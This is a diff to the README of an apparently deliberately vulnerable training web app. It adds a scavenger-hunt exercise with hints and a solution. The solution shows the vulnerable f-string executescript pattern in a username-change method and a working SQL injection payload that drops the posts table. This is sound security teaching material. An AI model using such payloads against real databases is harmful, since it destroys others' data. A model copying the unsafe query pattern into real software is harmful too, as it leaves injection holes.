@@ -22,9 +22,88 @@ pip install -r requirements.txt
 
 ## Scavenger Hunt
 
-1. Login, and make a post as a *different* user. e.g.: If you are logged in as `alice`, make a post as `bob`. (*Hint*: Inspect the HTML around the post.)
+1. Login, and make a post as a *different* user. e.g.: If you are logged in as `alice`, make a post as `bob`. (*Hint*: Inspect the HTML around the post).
 2. Open two browser windows (e.g. Chrome and Firefox, or Chrome + Chrome Incognito), and log in as two different users. e.g.: `alice` and `bob`. Make a post as `alice` that executes JavaScript code when `bob` logs in.
-3. Delete a post made by another user.
+3. Delete a post made by another user: *without* SQL injection and *without* logging in as that user.
+
+### 4. Use an SQL injection attack to drop the `posts` table
+
+<details>
+<summary><strong>Problem 4 Hints</strong></summary>
+
+<details>
+<summary>Hint #1</summary>
+
+In SQL, `--` is a comment, meaning that everything after `--` is ignored by the parser.
+
+```sql
+DROP TABLE posts; -- This is a comment, everything after the double-dash is ignored
+```
+
+</details>
+
+<details>
+<summary>Hint #2</summary>
+
+The architecture of an SQL injection attack is to write a query that is (1) valid SQL and passes the server's input validation and the database's query parser, but (2) does something unexpected.
+
+For example, if we have a query that normally inserts a name into a table:
+
+```sql
+INSERT INTO users (username) VALUES ('alice');
+```
+
+... consider what would happen if `alice` was replaced with `alice'); DROP TABLE posts; -- `. The resulting query would be:
+
+```sql
+INSERT INTO users (username) VALUES ('alice'); DROP TABLE posts; -- ');
+```
+
+</details>
+
+
+<details>
+<summary>Hint #3</summary>
+
+This site uses SQLite, which is normally built around the `sql.execute()` method. This takes a string as input and executes it as a query.
+
+This method has some built-in security. For example: if you try to execute a query that contains a semicolon (i.e., multiple statements), it will fail with something like:
+
+```python
+sqlite3.Warning: You can only execute one statement at a time.
+```
+
+If you have a local copy of the code, try finding *which line might be vulnerable* by grepping for a line of code that contains a non-standard execute call:
+
+```bash
+git grep -n 'self.curr.execute'
+```
+
+`git grep -n` returns the file and line number for each match.
+
+</details>
+
+
+<details>
+<summary>Solution</summary>
+
+Hints 1/2/3 should lead you toward the `/settings` page and "Change Username" form. The form is vulnerable to SQL injection because the `change_username` methods uses a dangerous pattern:
+
+```python
+script = f"PRAGMA foreign_keys = ON; UPDATE users SET username = '{new_username}' WHERE username = '{old_username}';"
+self.curr.executescript(script)
+```
+
+This is vulnerable because the `executescript` method allows multiple statements to be executed at once. If we can insert a semicolon into the `new_username` field and use our knowledge of our `old_username`, we can write a query that drops the `posts` table:
+
+```
+alice2' WHERE username = 'alice'; DROP TABLE posts; --
+```
+
+</details>
+
+
+</details>
 
 ## Legal Points
 
